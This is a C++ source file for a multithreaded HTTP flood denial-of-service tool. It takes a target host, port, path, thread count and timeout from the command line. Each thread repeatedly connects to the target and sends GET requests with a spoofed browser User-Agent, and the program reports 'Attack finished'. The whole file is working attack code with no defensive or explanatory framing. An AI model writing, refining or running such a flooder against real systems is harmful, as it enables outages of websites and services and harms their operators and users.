#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <cstring>
#include <signal.h>
#include <atomic>

using namespace std;

atomic<bool> keep_running(true);

void signal_handler(int signum) {
    keep_running = false;
}

void http_flood_worker(string host, int port, string path) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    string port_str = to_string(port);
    if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &res) != 0) {
        return;
    }

    // 构建一个简单的 HTTP GET 请求
    string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    request += "Accept: */*\r\n";
    request += "Connection: close\r\n\r\n";

    while (keep_running) {
        int s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s < 0) continue;

        if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
            send(s, request.c_str(), request.length(), 0);
        }
        close(s);
    }

    freeaddrinfo(res);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        cout << "Usage: " << argv[0] << " <host> [--port <port>] [--path <path>] [--threads <count>] [--timeout <sec>]" << endl;
        return 1;
    }

    string host = argv[1];
    int port = 80;
    string path = "/";
    int threads_count = 10;
    int timeout = 60;

    for (int i = 2; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "--port" && i + 1 < argc) port = stoi(argv[++i]);
        else if (arg == "--path" && i + 1 < argc) path = argv[++i];
        else if (arg == "--threads" && i + 1 < argc) threads_count = stoi(argv[++i]);
        else if (arg == "--timeout" && i + 1 < argc) timeout = stoi(argv[++i]);
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    cout << "[HTTP Flood] Starting " << threads_count << " threads against " << host << ":" << port << path << " for " << timeout << "s..." << endl;

    vector<thread> threads;
    for (int i = 0; i < threads_count; ++i) {
        threads.emplace_back(http_flood_worker, host, port, path);
    }

    auto start_time = chrono::steady_clock::now();
    while (keep_running) {
        auto current_time = chrono::steady_clock::now();
        if (chrono::duration_cast<chrono::seconds>(current_time - start_time).count() > timeout) {
            keep_running = false;
        }
        this_thread::sleep_for(chrono::milliseconds(100));
    }

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    cout << "Attack finished." << endl;
    return 0;
}
